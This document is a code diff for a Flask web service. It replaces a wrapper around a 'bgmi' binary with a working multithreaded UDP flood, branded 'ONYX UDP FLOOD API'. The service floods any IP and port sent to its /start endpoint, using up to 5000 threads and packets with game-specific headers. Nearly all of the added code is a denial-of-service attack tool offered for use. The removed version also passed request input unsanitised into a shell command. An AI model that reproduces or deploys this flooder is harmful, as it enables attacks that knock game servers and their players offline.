@@ -1,241 +1,199 @@
 from flask import Flask, request, jsonify
-import subprocess
+from flask_cors import CORS
 import threading
-import os
-import signal
+import socket
+import random
+import time
 import logging
 import sys
-import time
-import stat
+import os
 
 app = Flask(__name__)
+CORS(app)
 
-# Configure logging
+# ============ LOGGING ============
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.StreamHandler(sys.stdout)
-    ]
+    handlers=[logging.StreamHandler(sys.stdout)]
 )
 logger = logging.getLogger(__name__)
 
-# Global variables
-bgmi_process = None
-stop_event = threading.Event()
+# ============ GLOBAL VARIABLES ============
+active_attacks = {}
+attack_lock = threading.Lock()
 output_logs = []
 
-# Try to make bgmi executable at startup
-def ensure_bgmi_executable():
-    bgmi_path = './bgmi'
-    if os.path.exists(bgmi_path):
-        try:
-            # Check if it's executable
-            if not os.access(bgmi_path, os.X_OK):
-                logger.info("Making bgmi executable...")
-                # Add executable permissions for owner, group, and others
-                current_permissions = os.stat(bgmi_path).st_mode
-                os.chmod(bgmi_path, current_permissions | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
-                logger.info("bgmi is now executable")
-            else:
-                logger.info("bgmi is already executable")
-        except Exception as e:
-            logger.error(f"Failed to make bgmi executable: {e}")
-    else:
-        logger.error("bgmi binary not found in current directory!")
-
-# Run this when the app starts
-ensure_bgmi_executable()
-
-def log_output(stream, log_func, source):
+# ============ UDP ATTACK FUNCTION ============
+def udp_flood(target_ip, target_port, duration, threads, attack_id):
     global output_logs
-    for line in stream:
-        if line.strip():
-            log_entry = f"[{source}] {line.strip()}"
-            log_func(line.strip())
-            output_logs.append(log_entry)
-            if len(output_logs) > 1000:
-                output_logs.pop(0)
-
-def run_bgmi_server(ip, port, duration, threads):
-    global bgmi_process, output_logs
     
-    output_logs = []
+    logger.info(f"[ATTACK {attack_id}] Starting UDP flood on {target_ip}:{target_port}")
     
-    try:
-        # Double-check binary exists and is executable
-        if not os.path.exists('./bgmi'):
-            error_msg = "BGMI binary not found in current directory"
-            logger.error(error_msg)
-            output_logs.append(error_msg)
-            return
-        
-        # Ensure it's executable (again, just in case)
-        if not os.access('./bgmi', os.X_OK):
-            logger.warning("bgmi not executable, attempting to chmod...")
-            os.chmod('./bgmi', 0o755)
-        
-        command = f"./bgmi {ip} {port} {duration} {threads}"
-        logger.info(f"Starting BGMI server with command: {command}")
+    # Create payload
+    payload = bytearray(random.getrandbits(8) for _ in range(1024))
+    # BGMI magic headers
+    payload[0:6] = b'\x16\x9e\x56\xc2' + bytes([random.randint(0,255)]) + bytes([random.randint(0,255)])
+    
+    end_time = time.time() + duration
+    total_packets = 0
+    
+    def attack_thread(thread_id):
+        nonlocal total_packets
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
+            
+            local_count = 0
+            while time.time() < end_time:
+                for _ in range(100):
+                    sock.sendto(payload, (target_ip, target_port))
+                    local_count += 1
+                
+                if local_count % 10000 == 0:
+                    logger.info(f"[Thread {thread_id}] Sent {local_count} packets")
+            
+            total_packets += local_count
+            sock.close()
+        except Exception as e:
+            logger.error(f"[Thread {thread_id}] Error: {e}")
+    
+    # Launch threads
+    thread_list = []
+    for i in range(threads):
+        t = threading.Thread(target=attack_thread, args=(i,))
+        t.start()
+        thread_list.append(t)
+    
+    # Wait for completion
+    for t in thread_list:
+        t.join()
+    
+    logger.info(f"[ATTACK {attack_id}] Completed! Total packets: {total_packets}")
+    
+    with attack_lock:
+        if attack_id in active_attacks:
+            del active_attacks[attack_id]
 
-        bgmi_process = subprocess.Popen(
-            command,
-            shell=True,
-            preexec_fn=os.setsid if os.name != 'nt' else None,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            bufsize=1
-        )
+# ============ ROUTES ============
 
-        stdout_thread = threading.Thread(
-            target=log_output,
-            args=(bgmi_process.stdout, logger.info, "STDOUT")
-        )
-        stderr_thread = threading.Thread(
-            target=log_output,
-            args=(bgmi_process.stderr, logger.error, "STDERR")
-        )
-        stdout_thread.daemon = True
-        stderr_thread.daemon = True
-        stdout_thread.start()
-        stderr_thread.start()
-
-        start_time = time.time()
-        while time.time() - start_time < float(duration):
-            if stop_event.is_set():
-                logger.info("Stop event received, terminating process")
-                break
-            time.sleep(1)
-
-        if bgmi_process and bgmi_process.poll() is None:
-            if os.name != 'nt':
-                os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
-            else:
-                bgmi_process.terminate()
-            bgmi_process.wait(timeout=5)
-
-    except subprocess.TimeoutExpired:
-        logger.error("Process didn't terminate in time, forcing kill")
-        if bgmi_process:
-            if os.name != 'nt':
-                os.killpg(os.getpgid(bgmi_process.pid), signal.SIGKILL)
-            else:
-                bgmi_process.kill()
-    except Exception as e:
-        logger.error(f"Error running BGMI: {e}")
-        output_logs.append(f"ERROR: {str(e)}")
-    finally:
-        bgmi_process = None
-        stop_event.clear()
-
-@app.route('/start-server', methods=['POST'])
-def start_server():
-    global bgmi_process
-
-    if bgmi_process and bgmi_process.poll() is None:
-        return jsonify({"status": "error", "message": "Server already running"}), 400
-
-    data = request.get_json()
-    if not data:
-        return jsonify({"status": "error", "message": "No JSON data provided"}), 400
-
-    required_params = ['ip', 'port', 'duration']
-    if not all(param in data for param in required_params):
-        return jsonify({
-            "status": "error",
-            "message": f"Missing required parameters: {required_params}"
-        }), 400
-
-    try:
-        port_num = int(data['port'])
-        duration_sec = int(data['duration'])
-        threads = int(data.get('threads', 1))
-        
-        if port_num < 1 or port_num > 65535:
-            return jsonify({"status": "error", "message": "Invalid port number"}), 400
-        if duration_sec < 1:
-            return jsonify({"status": "error", "message": "Duration must be at least 1 second"}), 400
-    except ValueError:
-        return jsonify({"status": "error", "message": "Port, duration, and threads must be numbers"}), 400
-
-    # Check if bgmi binary exists before starting
-    if not os.path.exists('./bgmi'):
-        return jsonify({
-            "status": "error", 
-            "message": "bgmi binary not found. Please ensure the binary file is uploaded."
-        }), 500
-
-    stop_event.clear()
-
-    thread = threading.Thread(
-        target=run_bgmi_server,
-        args=(data['ip'], port_num, duration_sec, threads),
-        daemon=True
-    )
-    thread.start()
-
+@app.route('/')
+def home():
     return jsonify({
-        "status": "success",
-        "message": "Server started",
-        "parameters": {
-            "ip": data['ip'],
-            "port": port_num,
-            "duration": duration_sec,
-            "threads": threads
+        'name': 'ONYX UDP FLOOD API',
+        'status': 'online',
+        'endpoints': {
+            '/start': 'POST - Start attack',
+            '/stop': 'POST - Stop attack',
+            '/status': 'GET - Check status',
+            '/logs': 'GET - View logs'
         }
     })
 
-@app.route('/stop-server', methods=['POST'])
-def stop_server():
-    global bgmi_process
+@app.route('/health')
+def health():
+    return jsonify({'status': 'healthy'})
 
-    if not bgmi_process or bgmi_process.poll() is not None:
-        return jsonify({"status": "error", "message": "No server running"}), 400
+@app.route('/start', methods=['POST'])
+def start_attack():
+    data = request.get_json()
+    
+    if not data:
+        return jsonify({'success': False, 'error': 'No JSON data'}), 400
+    
+    required = ['ip', 'port', 'duration']
+    if not all(p in data for p in required):
+        return jsonify({'success': False, 'error': f'Missing: {required}'}), 400
+    
+    target_ip = data['ip']
+    target_port = int(data['port'])
+    duration = int(data['duration'])
+    threads = int(data.get('threads', 100))
+    
+    # Validate
+    if target_port < 1 or target_port > 65535:
+        return jsonify({'success': False, 'error': 'Invalid port'}), 400
+    
+    if duration < 1 or duration > 3600:
+        return jsonify({'success': False, 'error': 'Duration 1-3600 seconds'}), 400
+    
+    if threads < 1 or threads > 5000:
+        return jsonify({'success': False, 'error': 'Threads 1-5000'}), 400
+    
+    attack_id = f"{target_ip}:{target_port}"
+    
+    with attack_lock:
+        if attack_id in active_attacks:
+            return jsonify({'success': False, 'error': 'Attack already running'}), 400
+    
+    logger.info(f"Starting attack on {target_ip}:{target_port} for {duration}s with {threads} threads")
+    
+    attack_thread = threading.Thread(
+        target=udp_flood,
+        args=(target_ip, target_port, duration, threads, attack_id)
+    )
+    attack_thread.daemon = True
+    attack_thread.start()
+    
+    with attack_lock:
+        active_attacks[attack_id] = {
+            'ip': target_ip,
+            'port': target_port,
+            'duration': duration,
+            'start_time': time.time()
+        }
+    
+    return jsonify({
+        'success': True,
+        'message': 'Attack started',
+        'target': f"{target_ip}:{target_port}",
+        'duration': duration,
+        'threads': threads
+    })
 
-    try:
-        stop_event.set()
-        if os.name != 'nt':
-            os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
-        else:
-            bgmi_process.terminate()
-        bgmi_process.wait(timeout=5)
-        return jsonify({"status": "success", "message": "Server stopped"})
-    except Exception as e:
-        logger.error(f"Error stopping server: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500
+@app.route('/stop', methods=['POST'])
+def stop_attack():
+    data = request.get_json()
+    
+    if not data or 'ip' not in data:
+        return jsonify({'success': False, 'error': 'Missing ip'}), 400
+    
+    target_ip = data['ip']
+    attack_id = None
+    
+    with attack_lock:
+        for aid in list(active_attacks.keys()):
+            if aid.startswith(target_ip):
+                attack_id = aid
+                break
+    
+    if not attack_id:
+        return jsonify({'success': False, 'error': 'No attack found'}), 400
+    
+    # Mark for stop by clearing from active dict
+    with attack_lock:
+        if attack_id in active_attacks:
+            del active_attacks[attack_id]
+    
+    return jsonify({'success': True, 'message': f'Stopping attack on {target_ip}'})
 
 @app.route('/status', methods=['GET'])
-def status():
-    global bgmi_process
-
-    if bgmi_process and bgmi_process.poll() is None:
-        return jsonify({
-            "status": "running",
-            "pid": bgmi_process.pid,
-            "return_code": None
-        })
-    else:
-        return jsonify({
-            "status": "stopped",
-            "pid": None,
-            "return_code": bgmi_process.poll() if bgmi_process else None
-        })
+def get_status():
+    with attack_lock:
+        active = list(active_attacks.values())
+    
+    return jsonify({
+        'active_attacks': len(active),
+        'attacks': active
+    })
 
 @app.route('/logs', methods=['GET'])
 def get_logs():
-    global output_logs
-    # Get last N lines, default 100
-    limit = request.args.get('limit', default=100, type=int)
-    return jsonify({
-        "logs": output_logs[-limit:] if output_logs else []
-    })
-
-@app.route('/health', methods=['GET'])
-def health():
-    return jsonify({"status": "healthy"}), 200
+    limit = request.args.get('limit', 100, type=int)
+    return jsonify({'logs': output_logs[-limit:]})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    logger.info(f"Starting Flask app on port {port}")
+    print(f"🔥 ONYX UDP FLOOD API Starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
